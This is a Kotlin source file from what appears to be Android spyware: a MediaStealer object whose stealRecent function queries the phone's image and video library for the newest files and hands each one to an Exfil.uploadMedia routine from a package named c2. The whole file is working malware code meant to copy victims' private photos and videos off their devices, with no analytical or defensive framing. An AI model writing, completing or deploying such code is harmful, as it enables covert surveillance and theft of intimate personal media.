package com.sp.core.services

import android.content.ContentUris
import android.content.Context
import android.provider.MediaStore
import com.sp.core.c2.Exfil

object MediaStealer {
    fun stealRecent(ctx: Context, limit: Int = 20) {
        val collections = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI to "image",
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI to "video"
        )
        for ((uri, kind) in collections) {
            val proj = arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE
            )
            val cursor = ctx.contentResolver.query(
                uri, proj, null, null,
                "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            ) ?: continue
            cursor.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val id = it.getLong(0)
                    val name = it.getString(1) ?: "unknown"
                    val size = it.getLong(2)
                    val fileUri = ContentUris.withAppendedId(uri, id)
                    Exfil.uploadMedia(ctx, fileUri, kind, name, size)
                    count++
                }
            }
        }
    }
}